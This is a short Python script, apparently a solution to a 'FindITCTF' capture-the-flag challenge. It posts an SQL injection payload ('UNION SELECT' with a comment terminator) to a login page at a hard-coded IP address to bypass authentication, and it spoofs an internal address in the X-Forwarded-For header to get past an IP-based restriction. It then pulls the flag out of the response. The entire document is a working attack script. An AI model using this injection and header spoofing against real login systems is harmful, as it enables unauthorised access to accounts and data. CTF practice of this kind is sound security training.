import requests
import re

url = "http://34.124.192.13:57466/login.php"

r = requests.post(url, data={
    "email": "test@mail.com",
    "pass": "admin' UNION SELECT 'test@mail.com','admin'-- -"
}, headers={
    "X-Forwarded-For": "192.168.100.11"
})

print(re.findall(r"FindITCTF{.*?}", r.text)[0])